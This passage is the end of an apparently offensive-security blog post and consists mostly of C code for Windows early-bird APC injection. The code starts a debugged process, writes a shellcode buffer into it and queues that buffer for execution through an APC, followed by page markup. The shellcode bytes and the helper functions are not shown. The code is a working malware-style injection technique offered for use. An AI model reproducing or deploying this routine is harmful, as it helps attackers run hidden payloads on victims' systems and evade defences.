  <span class="n">DWORD</span><span class="o">*</span> <span class="n">dwProcessID</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">));</span>
  <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">));</span>
  <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">));</span>


  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateDebuggedProcess</span><span class="p">(</span><span class="n">Pname</span><span class="p">,</span> <span class="n">dwProcessID</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">hThread</span><span class="p">))</span> <span class="p">{</span>
  
    <span class="n">printf</span><span class="p">(</span><span class="s">"failed to CreateProcess Error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  
  <span class="p">};</span>

  <span class="n">PVOID</span><span class="o">*</span> <span class="n">pAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">InjectShellcode</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">pAddress</span><span class="p">))</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Inject Shellcode failed error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>


  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">APCInjection</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">pAddress</span><span class="p">,</span> <span class="n">dwProcessID</span><span class="p">))</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"APCInjection failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>

</code></pre></div></div>


        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>